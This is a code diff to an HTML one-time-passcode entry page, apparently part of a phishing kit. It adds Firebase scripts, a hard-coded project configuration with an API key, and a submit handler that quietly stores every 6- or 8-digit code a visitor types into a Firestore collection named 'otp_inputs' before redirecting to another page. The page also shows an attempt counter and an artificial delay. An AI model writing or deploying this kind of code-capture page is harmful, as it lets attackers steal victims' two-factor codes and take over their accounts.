@@ -3,6 +3,11 @@
 <head>
   <title>dehijlbrd</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+
   <style>
     html, body {
       margin: 0;
@@ -154,6 +159,20 @@
   </div>
 
   <script>
+    // Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
+      authDomain: "dlhiljbrd.firebaseapp.com",
+      projectId: "dlhiljbrd",
+      storageBucket: "dlhiljbrd.firebasestorage.app",
+      messagingSenderId: "981951131769",
+      appId: "1:981951131769:web:6ba4d6bfa570ffa62664a8"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
     let attempt = 1;
 
     function handleSubmit() {
@@ -171,18 +190,24 @@
           attempt++;
         } else {
           if (otp.value.length === 6 || otp.value.length === 8) {
-            window.location.href = "acpage.html";
+            db.collection("otp_inputs").add({
+              otp: otp.value,
+              timestamp: new Date()
+            }).then(() => {
+              window.location.href = "acpage.html";
+            }).catch((err) => {
+              alert("Failed to save OTP: " + err.message);
+            });
           } else {
             alert("Please enter a valid 6 or 8 digit OTP.");
           }
         }
-
       }, 4000);
 
       return false;
     }
 
-    // Countdown Timer - 3 minutes
+    // Countdown Timer
     let timeLeft = 180;
     const timerDisplay = document.getElementById("timer");
 
